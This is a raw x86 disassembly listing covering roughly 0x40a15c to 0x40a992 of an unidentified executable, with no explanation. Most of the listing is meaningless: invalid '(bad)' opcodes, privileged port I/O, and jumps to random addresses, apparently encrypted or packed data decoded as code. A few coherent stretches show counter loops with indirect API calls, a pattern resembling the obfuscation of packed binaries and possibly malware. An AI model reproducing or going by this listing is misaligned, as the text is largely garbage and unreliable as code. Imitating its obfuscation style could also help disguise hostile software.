  40a15c:	lods   al,BYTE PTR ds:[esi]
  40a15d:	sub    bh,BYTE PTR [edx-0x5e729a1c]
  40a163:	adc    BYTE PTR [esi+0x45],ch
  40a166:	div    DWORD PTR [edi+0x209309be]
  40a16c:	mov    ebx,0xa280614e
  40a171:	pop    es
  40a172:	and    dh,bl
  40a174:	dec    eax
  40a175:	add    BYTE PTR [ebp+eiz*2+0x65],al
  40a179:	mov    bh,0x3e
  40a17b:	das    
  40a17c:	jo     0x40a198
  40a17e:	inc    eax
  40a17f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a180:	in     eax,dx
  40a181:	cdq    
  40a182:	(bad)  [ecx+0x17]
  40a185:	add    DWORD PTR [edi-0x4543ee2d],0xffffff86
  40a18c:	or     dh,BYTE PTR [esp+ecx*2-0x61678df6]
  40a193:	mov    bh,0x6f
  40a195:	mov    al,0xf8
  40a197:	ficomp WORD PTR [ebx-0xf]
  40a19a:	mov    ch,0x36
  40a19c:	cdq    
  40a19d:	dec    ecx
  40a19e:	and    esi,ebp
  40a1a0:	mov    ah,0xc8
  40a1a2:	cwde   
  40a1a3:	xchg   ecx,eax
  40a1a4:	inc    edx
  40a1a5:	xchg   esi,eax
  40a1a6:	sub    ch,BYTE PTR [esi-0x13fc347b]
  40a1ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1ad:	xchg   edx,eax
  40a1ae:	(bad)  
  40a1af:	ja     0x40a19e
  40a1b1:	mov    eax,0x257e7713
  40a1b6:	inc    esp
  40a1b7:	test   al,0x70
  40a1b9:	sbb    BYTE PTR [edi],bh
  40a1bb:	push   ebx
  40a1bc:	mov    bh,0x46
  40a1be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1bf:	sub    esi,ecx
  40a1c1:	xor    DWORD PTR [edi],esp
  40a1c3:	popf   
  40a1c4:	lds    esi,FWORD PTR [ebp+0x7e]
  40a1c7:	mov    dl,0x39
  40a1c9:	sbb    DWORD PTR [ebx-0xe4263d8],ecx
  40a1cf:	adc    edi,DWORD PTR [edi-0x79]
  40a1d2:	je     0x40a1cb
  40a1d4:	(bad)  
  40a1d5:	pop    esp
  40a1d6:	js     0x40a247
  40a1d8:	and    BYTE PTR [eax],dl
  40a1da:	add    DWORD PTR ds:0x14baf67,esi
  40a1e0:	pop    esp
  40a1e1:	sub    esp,0x65
  40a1e4:	imul   eax,DWORD PTR [ebx+0x23e4aa90],0xd62155bd
  40a1ee:	lea    edi,[ebp-0x112bf25e]
  40a1f4:	jmp    0xfba1:0xa8678c1a
  40a1fb:	xchg   ebp,eax
  40a1fc:	dec    edx
  40a1fd:	inc    esi
  40a1fe:	xor    DWORD PTR [ebx+0x6c8f885],edi
  40a204:	pop    eax
  40a205:	mov    dl,0xbf
  40a207:	jp     0x40a245
  40a209:	add    ah,BYTE PTR [edi]
  40a20b:	sub    DWORD PTR [ecx],ebx
  40a20d:	outs   dx,BYTE PTR ds:[esi]
  40a20e:	sbb    eax,0xcc468baf
  40a213:	mov    ebx,0x1c475248
  40a218:	leave  
  40a219:	mov    ch,0xb6
  40a21b:	mov    dl,0x0
  40a21d:	jnp    0x40a28d
  40a21f:	popf   
  40a220:	sub    al,BYTE PTR [edi]
  40a222:	mov    bh,0xd5
  40a224:	int3   
  40a225:	mov    ebp,0x5e849a8e
  40a22a:	call   0xc7a557f1
  40a22f:	inc    ebp
  40a230:	cld    
  40a231:	rol    DWORD PTR [ebp+0x45c7f89c],1
  40a237:	fdiv   DWORD PTR [ebx]
  40a239:	test   DWORD PTR [eax+edi*8+0x45c7d213],ebx
  40a240:	aam    0x32
  40a242:	test   DWORD PTR [eax+edi*8-0x212da7f],ebx
  40a249:	inc    edx
  40a24a:	add    BYTE PTR [eax],al
  40a24c:	add    BYTE PTR [eax],al
  40a24e:	add    cl,ch
  40a250:	sldt   WORD PTR [eax]
  40a253:	add    BYTE PTR [ebx],dh
  40a255:	ror    BYTE PTR [ebx],cl
  40a257:	adc    eax,0x42fded
  40a25c:	inc    edx
  40a25d:	mov    DWORD PTR ds:0x42fded,edx
  40a263:	cmp    DWORD PTR ds:0x42fded,0x10
  40a26a:	jae    0x40a2a2
  40a270:	cmp    DWORD PTR ds:0x42fded,0x14
  40a277:	jne    0x40a297
  40a27d:	push   0x83c5
  40a282:	push   0x5a78
  40a287:	push   0x49ef
  40a28c:	push   0x22e4
  40a291:	call   DWORD PTR ds:0x42e3e7
  40a297:	jmp    0x40a254
  40a29c:	add    DWORD PTR ds:0x42e228,edx
  40a2a2:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  40a2a9:	and    DWORD PTR ds:0x42e80f,0x7d59
  40a2b3:	jmp    0x40a671
  40a2b8:	into   
  40a2b9:	iret   
  40a2ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2bb:	cmp    esp,DWORD PTR [ebp+0x7cc97171]
  40a2c1:	sbb    bl,BYTE PTR [edi+0x2b]
  40a2c4:	xchg   ebp,eax
  40a2c5:	stos   DWORD PTR es:[edi],eax
  40a2c6:	in     eax,0xa7
  40a2c8:	inc    ebp
  40a2c9:	cmc    
  40a2ca:	jo     0x40a33c
  40a2cc:	lahf   
  40a2cd:	jge    0x40a33f
  40a2cf:	jo     0x40a32d
  40a2d1:	jo     0x40a2cc
  40a2d3:	popa   
  40a2d4:	xchg   esi,eax
  40a2d5:	cdq    
  40a2d6:	scas   eax,DWORD PTR es:[edi]
  40a2d7:	ss jmp 0x71fb466c
  40a2dd:	(bad)  
  40a2de:	gs xchg ebx,eax
  40a2e0:	retf   
  40a2e1:	int3   
  40a2e2:	imul   ebx,DWORD PTR [ebx],0xbd8ef84b
  40a2e8:	mov    al,ds:0x6af2636e
  40a2ed:	jb     0x40a300
  40a2ef:	scas   al,BYTE PTR es:[edi]
  40a2f0:	repz inc ecx
  40a2f2:	push   0x3
  40a2f4:	push   ss
  40a2f5:	addr16 sti 
  40a2f7:	fucomp st(7)
  40a2f9:	push   0x4f
  40a2fb:	pcmpeqw mm4,QWORD PTR [ecx+0x5ef728eb]
  40a302:	mov    cl,0x50
  40a304:	leave  
  40a305:	ss call 0x68a4d3e2
  40a30b:	pminsw mm1,QWORD PTR [eax-0x3e53a6ec]
  40a312:	push   edi
  40a313:	sub    ah,bl
  40a315:	sub    DWORD PTR [edi+0x835ecab],ebx
  40a31b:	int3   
  40a31c:	nop
  40a31d:	push   0xffffff9d
  40a31f:	lea    esp,[edi-0x760b33e]
  40a325:	iret   
  40a326:	lahf   
  40a327:	pushf  
  40a328:	(bad)  
  40a329:	or     edi,DWORD PTR [esp+edi*4]
  40a32c:	int    0x5f
  40a32e:	es dec edx
  40a330:	es daa 
  40a332:	sti    
  40a333:	dec    ebx
  40a334:	pop    ebx
  40a335:	adc    al,0x6f
  40a337:	call   0x3fc2316d
  40a33c:	xor    DWORD PTR [edx-0x465969b0],edx
  40a342:	pop    eax
  40a343:	test   DWORD PTR [ebx+0x25],ebx
  40a346:	ja     0x40a376
  40a348:	inc    ebp
  40a349:	add    DWORD PTR [edx-0x28f449a7],esp
  40a34f:	mov    al,ds:0x78c53ee6
  40a354:	push   cs
  40a355:	mov    ch,0x63
  40a357:	ss xor eax,0x101b00ea
  40a35d:	pusha  
  40a35e:	inc    ebx
  40a35f:	xor    al,0xe3
  40a361:	ins    DWORD PTR es:[edi],dx
  40a362:	outs   dx,DWORD PTR ds:[esi]
  40a363:	jmp    0x40a355
  40a365:	mov    ebp,0x6564f53
  40a36a:	aas    
  40a36b:	shr    DWORD PTR [eax-0x6a],1
  40a36e:	mov    ah,0x1f
  40a370:	test   BYTE PTR [ebp+0x53],0x20
  40a374:	fisub  DWORD PTR [esi-0x1b63abea]
  40a37a:	fldpi  
  40a37c:	mov    ch,0x1a
  40a37e:	mov    eax,ds:0x473594c1
  40a383:	jg     0x40a373
  40a385:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a386:	xchg   DWORD PTR [eax+0x5f8f5801],eax
  40a38c:	pushf  
  40a38d:	aas    
  40a38e:	shr    dh,cl
  40a390:	cmp    dl,dl
  40a392:	ds dec ecx
  40a394:	test   al,ah
  40a396:	inc    ebp
  40a397:	unpcklps xmm6,XMMWORD PTR [edx+0x15]
  40a39b:	dec    edx
  40a39c:	repz and DWORD PTR [edi],0x908f5dc6
  40a3a3:	icebp  
  40a3a4:	dec    edi
  40a3a5:	sub    DWORD PTR [esp+ebp*2-0x4789627f],0x4ad31620
  40a3b0:	fisub  DWORD PTR ds:0x8b47622b
  40a3b6:	rol    BYTE PTR [eax],0xc1
  40a3b9:	push   esp
  40a3ba:	imul   ebp,DWORD PTR [ebp-0x219afb33],0xc
  40a3c1:	push   esp
  40a3c2:	add    ebx,esi
  40a3c4:	or     al,0x82
  40a3c6:	stos   DWORD PTR es:[edi],eax
  40a3c7:	cmp    al,0x18
  40a3c9:	xchg   bh,bh
  40a3cb:	and    eax,0xd54bd2cd
  40a3d0:	push   0xffffffa9
  40a3d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a3d3:	loop   0x40a3d0
  40a3d5:	imul   esp,DWORD PTR [esi],0xffffff94
  40a3d8:	loop   0x40a39e
  40a3da:	lea    ebp,[eax+0x2b2d6a19]
  40a3e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3e1:	add    BYTE PTR [esp+ebp*2-0x7da8d61b],ah
  40a3e8:	add    al,0xfb
  40a3ea:	cli    
  40a3eb:	mov    al,ds:0x9bc7d8bd
  40a3f0:	pop    eax
  40a3f1:	adc    eax,0xf61ca78b
  40a3f6:	pop    DWORD PTR [eax+0xc]
  40a3f9:	ins    DWORD PTR es:[edi],dx
  40a3fa:	adc    DWORD PTR [ecx-0x10],eax
  40a3fd:	stos   DWORD PTR es:[edi],eax
  40a3fe:	mov    esp,0xb9f10c7b
  40a403:	imul   edx,edi,0x10
  40a406:	mov    ?,WORD PTR [esi]
  40a408:	sbb    edi,DWORD PTR [ebp+0x65d09347]
  40a40e:	or     DWORD PTR [ebx-0x12ceae31],edx
  40a414:	add    eax,0xd3334abf
  40a419:	call   0x58126689
  40a41e:	add    ch,ch
  40a420:	jbe    0x40a458
  40a422:	out    dx,eax
  40a423:	loopne 0x40a44c
  40a425:	inc    esi
  40a426:	ds push ss
  40a428:	pushf  
  40a429:	pop    ebx
  40a42a:	sbb    dh,BYTE PTR [eax-0x7db5b8fb]
  40a430:	sub    DWORD PTR [edi],0x76
  40a433:	ds dec ebp
  40a435:	xor    bl,dh
  40a437:	cmc    
  40a438:	xor    eax,0x91d9a5ad
  40a43d:	push   ecx
  40a43e:	aas    
  40a43f:	and    al,cl
  40a441:	dec    eax
  40a442:	mov    bl,0x16
  40a444:	inc    eax
  40a445:	sbb    cl,dh
  40a447:	hlt    
  40a448:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a449:	cmp    eax,0x742abe6a
  40a44e:	jl     0x40a479
  40a450:	inc    eax
  40a451:	dec    esi
  40a452:	imul   DWORD PTR [edx]
  40a454:	repz or eax,0x347e0aa2
  40a45a:	gs lahf 
  40a45c:	pop    eax
  40a45d:	mov    ah,0xa2
  40a45f:	lock mov cl,0x61
  40a462:	ret    0x414
  40a465:	sbb    bl,BYTE PTR [esi-0x3727a5af]
  40a46b:	dec    ecx
  40a46c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a46d:	jbe    0x40a3f9
  40a46f:	pusha  
  40a470:	xor    DWORD PTR [di+0x6132],edx
  40a475:	push   ss
  40a476:	retf   0x7f15
  40a479:	xor    ebx,DWORD PTR ds:0xaaae840c
  40a47f:	inc    eax
  40a480:	ins    BYTE PTR es:[edi],dx
  40a481:	mov    esi,0x85d742bb
  40a486:	outs   dx,BYTE PTR ds:[esi]
  40a487:	retf   0x93bd
  40a48a:	sub    esp,DWORD PTR [ebx-0x3f]
  40a48d:	imul   ebp,DWORD PTR [esi],0xffffff9e
  40a490:	add    eax,0x55eeeb42
  40a495:	mov    al,0x24
  40a497:	call   ebp
  40a499:	out    0x9,al
  40a49b:	test   bl,bl
  40a49d:	xor    ch,BYTE PTR [edx]
  40a49f:	scas   al,BYTE PTR es:[edi]
  40a4a0:	xchg   esi,eax
  40a4a1:	push   ds
  40a4a2:	adc    eax,ecx
  40a4a4:	jo     0x40a439
  40a4a6:	inc    ecx
  40a4a7:	fs add ebp,esp
  40a4aa:	call   0x4d8c0a14
  40a4af:	xchg   DWORD PTR [esi],ecx
  40a4b1:	popf   
  40a4b2:	retf   
  40a4b3:	test   al,0xa8
  40a4b5:	fist   WORD PTR [eax+0x3cd7442f]
  40a4bb:	push   ebx
  40a4bc:	dec    esp
  40a4bd:	xchg   edx,eax
  40a4be:	leave  
  40a4bf:	jns    0x40a4ba
  40a4c1:	and    DWORD PTR [ecx],ebp
  40a4c3:	pop    esi
  40a4c4:	or     DWORD PTR [ebx],ebp
  40a4c6:	icebp  
  40a4c7:	sub    eax,0xb9e7f363
  40a4cc:	sub    DWORD PTR [ebx+0x74e09bec],eax
  40a4d2:	and    BYTE PTR [edi],ah
  40a4d4:	inc    ecx
  40a4d5:	out    dx,eax
  40a4d6:	cld    
  40a4d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a4d8:	out    0x23,al
  40a4da:	sti    
  40a4db:	out    dx,al
  40a4dc:	retf   0x11f
  40a4df:	adc    ah,BYTE PTR [ebx+0x4a]
  40a4e2:	loopne 0x40a46f
  40a4e4:	fbld   TBYTE PTR [edi]
  40a4e6:	retf   
  40a4e7:	xchg   ecx,eax
  40a4e8:	jmp    0x8181:0xdca10648
  40a4ef:	jl     0x40a490
  40a4f1:	add    DWORD PTR [eax+0x57],eax
  40a4f4:	ret    0xcb9f
  40a4f7:	jmp    0x40a4d7
  40a4f9:	mov    cl,0x96
  40a4fb:	jae    0x40a4db
  40a4fd:	push   edi
  40a4fe:	jae    0x40a4f7
  40a500:	dec    edx
  40a501:	(bad)  [edx+0x2]
  40a504:	aad    0x76
  40a506:	mov    dl,0xd
  40a508:	inc    esi
  40a509:	inc    edi
  40a50a:	push   esp
  40a50b:	fyl2xp1 
  40a50d:	push   ebx
  40a50e:	pop    esi
  40a50f:	add    ah,BYTE PTR [ebx+0x6d]
  40a512:	loope  0x40a592
  40a514:	je     0x40a519
  40a516:	adc    bh,ch
  40a518:	gs inc edx
  40a51a:	fstp   TBYTE PTR [edx+0x12]
  40a51d:	repz push esi
  40a51f:	rcl    DWORD PTR [edx],1
  40a521:	retf   0xd60
  40a524:	mov    edx,0x5403eeda
  40a529:	shld   esp,ebp,cl
  40a52c:	or     dh,BYTE PTR [edx+eax*2]
  40a52f:	pop    esp
  40a530:	and    BYTE PTR [edi-0x22],dl
  40a533:	es leave 
  40a535:	jo     0x40a54e
  40a537:	outs   dx,BYTE PTR ds:[esi]
  40a538:	jg     0x40a5a2
  40a53a:	popa   
  40a53b:	cmp    ecx,DWORD PTR [esi+ebx*8]
  40a53e:	jbe    0x40a4db
  40a540:	xor    ch,BYTE PTR [eax]
  40a542:	in     eax,0x42
  40a544:	jbe    0x40a525
  40a546:	ret    
  40a547:	call   0xbdfc6820
  40a54c:	popa   
  40a54d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a54e:	gs mov dh,0xad
  40a551:	shl    DWORD PTR [ebp-0x32],1
  40a554:	lods   al,BYTE PTR ds:[esi]
  40a555:	in     eax,0xac
  40a557:	in     al,0xaf
  40a559:	daa    
  40a55a:	push   cs
  40a55b:	cs pop ss
  40a55d:	leave  
  40a55e:	shl    al,1
  40a560:	pop    ds
  40a561:	(bad)  
  40a562:	pushf  
  40a563:	sahf   
  40a564:	pop    ss
  40a565:	pop    ebx
  40a566:	rcl    BYTE PTR [ecx+0x45],cl
  40a569:	xchg   edi,eax
  40a56a:	push   ss
  40a56b:	gs popf 
  40a56d:	xchg   esi,eax
  40a56e:	sbb    BYTE PTR [ebx+eax*4-0x13866db0],al
  40a575:	xchg   edx,eax
  40a576:	add    BYTE PTR [edi+eax*2+0x502296d4],dh
  40a57d:	sbb    al,bh
  40a57f:	pop    ds
  40a580:	xor    edi,DWORD PTR [edx]
  40a582:	inc    ecx
  40a583:	stos   DWORD PTR es:[edi],eax
  40a584:	imul   esi,DWORD PTR [ecx],0xffffff82
  40a587:	xor    DWORD PTR ds:0xf92ed186,ebp
  40a58d:	test   eax,0x658f9cdc
  40a592:	xchg   ebx,eax
  40a593:	mov    bh,0xa7
  40a595:	pop    ebx
  40a596:	out    0xcf,eax
  40a598:	push   ebp
  40a599:	jo     0x40a55b
  40a59b:	test   BYTE PTR [ebp-0x5f76c176],dh
  40a5a1:	pop    ebp
  40a5a2:	fisubr WORD PTR [eax-0x4263cc2]
  40a5a8:	mov    bh,0x81
  40a5aa:	cmp    edi,ecx
  40a5ac:	xor    al,0xec
  40a5ae:	push   esi
  40a5af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5b0:	std    
  40a5b1:	push   ss
  40a5b2:	sub    eax,0x6938763a
  40a5b7:	mov    bl,0x26
  40a5b9:	pop    esp
  40a5ba:	xchg   BYTE PTR [edx],dl
  40a5bc:	adc    al,0xe6
  40a5be:	dec    esp
  40a5bf:	js     0x40a580
  40a5c1:	(bad)  
  40a5c2:	call   0x6807a46a
  40a5c7:	mov    ds,WORD PTR [eax]
  40a5c9:	(bad)  
  40a5ca:	push   0xffffffbc
  40a5cc:	jns    0x40a59d
  40a5ce:	inc    ebp
  40a5cf:	adc    BYTE PTR [ebx+0x12ea6efa],0x4
  40a5d6:	call   0x77f7:0x2e7255a4
  40a5dd:	dec    edi
  40a5de:	sbb    edx,DWORD PTR [eax]
  40a5e0:	mov    esp,DWORD PTR [ebx-0x6e]
  40a5e3:	ror    al,1
  40a5e5:	repnz (bad)
  40a5e8:	and    edx,DWORD PTR [ebx+0x73605471]
  40a5ee:	xor    ebx,ecx
  40a5f0:	jl     0x40a597
  40a5f2:	out    0xc2,al
  40a5f4:	rol    BYTE PTR [edi-0x720b0a59],1
  40a5fa:	mov    WORD PTR [ebx+0x2f],ss
  40a5fd:	mov    ds:0xa6b3c45d,eax
  40a602:	scas   eax,DWORD PTR es:[edi]
  40a603:	xchg   ecx,eax
  40a604:	leave  
  40a605:	xchg   ecx,eax
  40a606:	bswap  edi
  40a608:	mov    bh,0x9
  40a60a:	in     eax,0x58
  40a60c:	sub    al,0xb0
  40a60e:	cwde   
  40a60f:	adc    al,0xce
  40a611:	test   eax,0x32005f0
  40a616:	lods   al,BYTE PTR ds:[esi]
  40a617:	inc    edx
  40a618:	dec    edi
  40a619:	mov    ecx,0x51e961f2
  40a61e:	dec    edx
  40a61f:	mov    WORD PTR es:[esi],?
  40a622:	mov    edx,0x62fa6c4b
  40a627:	icebp  
  40a628:	push   ebp
  40a629:	hlt    
  40a62a:	pop    ecx
  40a62b:	icebp  
  40a62c:	xlat   BYTE PTR ds:[ebx]
  40a62d:	cmp    BYTE PTR [eax],al
  40a62f:	push   0x60b155d9
  40a634:	ds ret 0x6816
  40a638:	pop    DWORD PTR [esi+0x6c]
  40a63b:	(bad)  
  40a63c:	jmp    0xa0c260c7
  40a641:	test   al,0x95
  40a643:	rcl    DWORD PTR [eax],0x8e
  40a646:	xchg   ecx,eax
  40a647:	mov    al,ds:0x7599bfa8
  40a64c:	sbb    eax,0x6c709f84
  40a651:	shl    BYTE PTR [esi+0x6f91c8e7],cl
  40a657:	push   DWORD PTR [edi-0x858b422]
  40a65d:	or     al,0x94
  40a65f:	jnp    0x40a6a6
  40a661:	sbb    BYTE PTR [esi],0xad
  40a664:	adc    cl,BYTE PTR [ecx-0x18f2e9f]
  40a66a:	arpl   WORD PTR [ebx+0x4df939a],di
  40a670:	fld    st(7)
  40a672:	inc    ebp
  40a673:	int3   
  40a674:	cmp    al,0x85
  40a676:	pushf  
  40a677:	clc    
  40a678:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40a67f:	and    DWORD PTR ds:0x42e7ef,0x0
  40a689:	xor    edx,edx
  40a68b:	or     edx,DWORD PTR ds:0x42e7ef
  40a691:	inc    edx
  40a692:	mov    DWORD PTR ds:0x42e7ef,edx
  40a698:	cmp    DWORD PTR ds:0x42e7ef,0xf
  40a69f:	jne    0x40a6c6
  40a6a5:	push   DWORD PTR [ebp-0x28]
  40a6a8:	push   DWORD PTR [ebp-0x10]
  40a6ab:	push   0x42e7f7
  40a6b0:	push   DWORD PTR [ebp-0x14]
  40a6b3:	push   DWORD PTR [ebp-0x18]
  40a6b6:	push   0x89bc
  40a6bb:	push   0x39f6
  40a6c0:	call   DWORD PTR ds:0x42e3eb
  40a6c6:	cmp    DWORD PTR ds:0x42e7ef,0xe
  40a6cd:	jne    0x40a6e0
  40a6d3:	mov    edx,DWORD PTR ds:0x42e7ef
  40a6d9:	inc    edx
  40a6da:	mov    DWORD PTR ds:0x42e7ef,edx
  40a6e0:	cmp    DWORD PTR ds:0x42e7ef,0x1c
  40a6e7:	jb     0x40a689
  40a6ed:	and    DWORD PTR ds:0x42fddd,0x0
  40a6f7:	jmp    0x40a709
  40a6fc:	mov    edx,DWORD PTR ds:0x42fddd
  40a702:	inc    edx
  40a703:	mov    DWORD PTR ds:0x42fddd,edx
  40a709:	cmp    DWORD PTR ds:0x42fddd,0x13
  40a710:	jae    0x40a766
  40a716:	cmp    DWORD PTR ds:0x42fddd,0xb
  40a71d:	jne    0x40a733
  40a723:	push   0x42e36d
  40a728:	push   0x42e35b
  40a72d:	call   DWORD PTR ds:0x42e647
  40a733:	cmp    DWORD PTR ds:0x42fddd,0xa
  40a73a:	jne    0x40a74f
  40a740:	xor    edx,edx
  40a742:	add    edx,DWORD PTR ds:0x42fddd
  40a748:	inc    edx
  40a749:	mov    DWORD PTR ds:0x42fddd,edx
  40a74f:	jmp    0x40a6fc
  40a754:	mov    edi,DWORD PTR ds:0x42e234
  40a75a:	xor    edi,DWORD PTR ds:0x42e813
  40a760:	mov    DWORD PTR ds:0x42e234,edi
  40a766:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  40a76d:	adc    DWORD PTR ds:0x42e813,edx
  40a773:	mov    edx,DWORD PTR [ebp+0x8]
  40a776:	xor    edx,eax
  40a778:	sub    edi,DWORD PTR ds:0x42fdd1
  40a77e:	mov    edi,DWORD PTR [ebp-0x10]
  40a781:	add    edx,ecx
  40a783:	mov    DWORD PTR ds:0x42fde5,0x29c7
  40a78d:	cmp    edi,edx
  40a78f:	mov    DWORD PTR ds:0x42e813,0x10c5
  40a799:	je     0x40d88b
  40a79f:	mov    DWORD PTR ds:0x42fdf9,0x41c2
  40a7a9:	push   ebx
  40a7aa:	mov    DWORD PTR ds:0x42fe09,0x2602
  40a7b4:	jmp    0x40d4a8
  40a7b9:	mov    edx,DWORD PTR [ebp-0x8]
  40a7bc:	mov    DWORD PTR ds:0x42e230,0x1c
  40a7c6:	cmp    DWORD PTR ds:0x42e230,0x0
  40a7cd:	je     0x40a824
  40a7d3:	cmp    DWORD PTR ds:0x42e230,0x7
  40a7da:	jne    0x40a7f8
  40a7e0:	push   DWORD PTR [ebp-0x10]
  40a7e3:	push   0x42e2e7
  40a7e8:	push   0x42e33d
  40a7ed:	push   0x42e33d
  40a7f2:	call   DWORD PTR ds:0x42e3ef
  40a7f8:	cmp    DWORD PTR ds:0x42e230,0x8
  40a7ff:	jne    0x40a812
  40a805:	mov    edi,DWORD PTR ds:0x42e230
  40a80b:	dec    edi
  40a80c:	mov    DWORD PTR ds:0x42e230,edi
  40a812:	mov    edi,DWORD PTR ds:0x42e230
  40a818:	dec    edi
  40a819:	mov    DWORD PTR ds:0x42e230,edi
  40a81f:	jmp    0x40a7c6
  40a824:	mov    edi,DWORD PTR [ebp-0x10]
  40a827:	xor    DWORD PTR ds:0x42e22c,0x3333
  40a831:	sub    edi,edx
  40a833:	mov    edx,DWORD PTR ds:0x42fe6e
  40a839:	add    DWORD PTR ds:0x42e807,edx
  40a83f:	mov    edx,DWORD PTR [ebp-0x4]
  40a842:	jmp    0x40ac00
  40a847:	addr16 sub al,0x5e
  40a84a:	xchg   esi,eax
  40a84b:	jno    0x40a89f
  40a84d:	ja     0x40a838
  40a84f:	dec    eax
  40a850:	(bad)  
  40a851:	in     al,dx
  40a852:	std    
  40a853:	xchg   esp,eax
  40a854:	sbb    eax,0xf1e42993
  40a859:	jo     0x40a8cb
  40a85b:	lahf   
  40a85c:	jge    0x40a8ce
  40a85e:	jo     0x40a84e
  40a860:	or     BYTE PTR [edi-0x31],dl
  40a863:	xlat   BYTE PTR ds:[ebx]
  40a864:	(bad)  
  40a865:	xadd   DWORD PTR [esi],ecx
  40a868:	fnstenv [ecx+0x2f]
  40a86b:	cmp    edi,edi
  40a86d:	sbb    ebp,DWORD PTR [eax+0x3e99be3]
  40a873:	xor    esp,DWORD PTR [ecx-0xd]
  40a876:	push   esi
  40a877:	test   esp,ecx
  40a879:	fucomip st,st(5)
  40a87b:	mov    ecx,0x2695c867
  40a880:	xor    al,0x4f
  40a882:	int3   
  40a883:	add    al,0x91
  40a885:	pop    edi
  40a886:	sub    eax,0x8f9750f3
  40a88b:	hlt    
  40a88c:	jmp    0x40a8a8
  40a88e:	jecxz  0x40a8e5
  40a890:	xor    eax,0x1b220fad
  40a895:	bswap  edx
  40a897:	jno    0x40a90a
  40a899:	in     al,dx
  40a89a:	rcl    DWORD PTR ds:0x598ed90b,cl
  40a8a0:	xchg   edi,eax
  40a8a1:	(bad)  
  40a8a2:	jae    0x40a8f2
  40a8a4:	mov    edi,0x60ec43df
  40a8a9:	rcr    BYTE PTR [esi],cl
  40a8ab:	or     DWORD PTR [esi],ebp
  40a8ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8ae:	pop    ss
  40a8af:	add    ecx,DWORD PTR [edi-0x26]
  40a8b2:	aas    
  40a8b3:	add    ebp,esi
  40a8b5:	push   eax
  40a8b6:	xor    BYTE PTR [edi+eiz*4-0x746a7e9b],ch
  40a8bd:	sbb    eax,DWORD PTR [ecx-0xfabb1c3]
  40a8c3:	xchg   BYTE PTR [ebp-0x11214830],ah
  40a8c9:	sbb    eax,0x251e922b
  40a8ce:	fcmovne st,st(5)
  40a8d0:	sti    
  40a8d1:	shr    DWORD PTR [ecx],cl
  40a8d3:	xchg   edi,eax
  40a8d4:	pop    es
  40a8d5:	add    esi,DWORD PTR [eax+esi*2+0x61513114]
  40a8dc:	out    dx,eax
  40a8dd:	xchg   esi,eax
  40a8de:	jle    0x40a89b
  40a8e0:	(bad)  
  40a8e1:	jmp    0xe178788f
  40a8e6:	sbb    al,0x2c
  40a8e8:	sbb    BYTE PTR [edx-0x54],cl
  40a8eb:	cmp    BYTE PTR [eax],bh
  40a8ed:	fwait
  40a8ee:	and    esi,ecx
  40a8f0:	and    al,dh
  40a8f2:	outs   dx,BYTE PTR ds:[esi]
  40a8f3:	lea    edi,[edi-0x53167354]
  40a8f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8fa:	add    BYTE PTR gs:[esi-0xe9865fd],ah
  40a901:	lods   al,BYTE PTR ds:[esi]
  40a902:	add    DWORD PTR [ecx+0xaf098e],eax
  40a908:	pop    es
  40a909:	adc    eax,DWORD PTR [eax-0x24d6366]
  40a90f:	xor    ah,BYTE PTR [ebx+ebp*1]
  40a912:	std    
  40a913:	push   ebp
  40a914:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a915:	mov    ch,0x45
  40a917:	xchg   ecx,eax
  40a918:	cmp    edx,esp
  40a91a:	jo     0x40a8bc
  40a91c:	mov    bl,0xa
  40a91e:	(bad)  
  40a91f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a920:	cwde   
  40a921:	xor    BYTE PTR [ebx+eax*1+0x14922442],dh
  40a928:	jecxz  0x40a8df
  40a92a:	adc    al,0x59
  40a92c:	pop    ds
  40a92d:	stos   DWORD PTR es:[edi],eax
  40a92e:	or     al,BYTE PTR [edx+0x27]
  40a931:	enter  0xf5f8,0x5a
  40a935:	xor    al,0x97
  40a938:	mov    cl,0x4
  40a93a:	and    ebp,DWORD PTR [ebx]
  40a93c:	test   bl,al
  40a93e:	push   0x61117e7f
  40a943:	sub    al,0x98
  40a945:	or     al,0x6b
  40a947:	fdiv   DWORD PTR [eax-0x61]
  40a94a:	fiadd  WORD PTR [ebp-0x2c9d43c8]
  40a950:	dec    ecx
  40a951:	aad    0xf9
  40a953:	adc    al,0x15
  40a955:	adc    DWORD PTR [eax+ebp*8],ecx
  40a958:	push   eax
  40a959:	test   al,0x14
  40a95b:	scas   eax,DWORD PTR es:[edi]
  40a95c:	mov    dh,0xf1
  40a95e:	xchg   ebx,eax
  40a95f:	clc    
  40a960:	pop    es
  40a961:	into   
  40a962:	cmp    BYTE PTR [esi],cl
  40a964:	sar    DWORD PTR [ebx+0x2a],0xd1
  40a968:	add    BYTE PTR [ecx+0x32],bl
  40a96b:	cmc    
  40a96c:	aas    
  40a96d:	arpl   WORD PTR [ecx-0xe1b2f87],ax
  40a973:	adc    al,0x51
  40a975:	push   ecx
  40a976:	out    0x24,eax
  40a978:	add    eax,0xda499180
  40a97d:	mov    dh,0x54
  40a97f:	sahf   
  40a980:	cs scas eax,DWORD PTR es:[edi]
  40a982:	icebp  
  40a983:	pop    ebx
  40a984:	adc    al,bl
  40a986:	jns    0x40a9a2
  40a988:	test   DWORD PTR [eax+0x6],ecx
  40a98b:	mul    BYTE PTR [esi]
  40a98d:	and    bl,ch
  40a98f:	mov    cl,0x8f
  40a991:	xchg   ecx,eax
  40a992:	por    mm1,QWORD PTR [ecx]
